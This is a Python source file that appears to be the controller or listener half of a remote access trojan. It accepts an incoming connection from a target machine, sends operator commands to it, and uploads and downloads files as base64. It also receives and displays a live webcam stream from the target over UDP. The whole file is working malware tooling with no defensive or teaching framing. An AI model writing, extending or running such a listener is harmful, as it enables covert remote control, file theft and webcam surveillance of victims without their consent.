from colorama import (  # type: ignore
   Fore,
   init
)

import numpy as np
import threading
import keyboard
import socket
import base64
import dotenv
import json
import sys
import cv2
import os


class CameraSocket(object):

    def __init__(self, /) -> None:
        self.ip = os.getenv("IP")
        self.port = int(os.getenv("CAMERA_PORT"))
        self.buff_size = int(os.getenv("BUFFER"))

    def create_connection(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.buff_size)
        server.bind((self.ip, self.port))
        print(f"[+] LISTENING AT: {(self.ip, self.port)}")
        return server


class GetCamera(CameraSocket):

    def __init__(self, executing: bool = False) -> None:
        super(GetCamera, self).__init__()
        self.executing: bool = executing
        if self.executing:
            self.server = self.create_connection()

    def start(self):
        threading.Thread(target=self.recieve_frame).start()

    def stop(self):
        NotImplemented

    def recieve_frame(self):
        while True:
            packet, _ = self.server.recvfrom(self.buff_size)
            data = base64.b64decode(packet, ' /')
            npdata = np.frombuffer(data, dtype=np.uint8)
            frame = cv2.imdecode(npdata, 1)
            cv2.imshow("RECEIVING VIDEO", frame)
            cv2.waitKey(1)
            if keyboard.is_pressed("ctrl+alt+space"):
                break

class File(object):

    def __init__(self, filename) -> None:
        self.filename = filename

    def read(self):
        with open(self.filename, "rb") as f:
            return base64.b64encode(f.read())

    def write(self, content) -> str:
        with open(self.filename, "wb") as f:
            f.write(base64.b64decode(content))
            return f"{Fore.GREEN}[+] DOWNLOAD SUCCESSFUL..."


class Commands(object):

    def __init__(self, command) -> None:
        self.command = command

    def allowed(self):
        return {
            "upload": self.upload_command,
            "cd": self.change_directory,
            "camera": self.camera_command
        }

    def verify_command(self):
        commands = self.allowed()
        if self.command[0] in commands.keys():
            return commands.get(self.command[0])()
        return self.command

    def change_directory(self):
        if len(self.command) > 2:
            self.command[1] = " ".join(self.command[1:])
        return self.command

    def camera_command(self):
        if self.command[1] == "start":
            GetCamera().start()
        if self.command[1] == "stop":
            GetCamera().stop()
        return self.command

    def download_command(self, content) -> str:
        return File(self.command[1]).write(content)

    def upload_command(self):
        self.command.append(
            File(self.command[1]).read().decode()
        )
        return self.command


class Socket(object):

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = self.create_connection()

    def create_connection(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind((self.ip, self.port))
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.listen(0)
            print(f"{Fore.GREEN}[+] WAITTING FOR INCOMING CONNECTIONS...")
            connection, address = sock.accept()
            print(f"{Fore.GREEN}[+] GOT A CONNECTION FROM {str(address)}...")
            return connection

    def reliable_send(self, data):
        self.connection.send(json.dumps(data).encode("cp850"))

    def reliable_recive(self):
        while True:
            try:
                return json.loads(self.connection.recv(4096).decode())
            except Exception:
                return f"{Fore.RED}[-] JSON ERROR..."


class Listener(Socket):

    def __init__(self, ip, port) -> None:
        super().__init__(ip, port)

    def execute_command(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            sys.exit(1)

        return self.reliable_recive()

    def start(self):
        while True:
            command = input(f"{Fore.GREEN}[:] ").split(" ")

            try:
                commands = Commands(command)
                result = self.execute_command(commands.verify_command())

                if command[0] == "download" and not str(result).startswith("[-] ERROR "):
                    result = commands.download_command(result[2])

            except Exception as e:
                print(e)
                result = f"{Fore.RED}[-] ERROR DURING COMMAND EXECUTION [SERVER SIDE]..."
            print(result)


def main():
    dotenv.load_dotenv()
    init(autoreset=True)
    try:
        listener = Listener(os.getenv("MACHINE_IP"), int(os.getenv("PORT")))
        listener.start()
    except Exception as e:
        print(f"{Fore.RED}[-] {e}...")


if __name__ == "__main__":
    main()
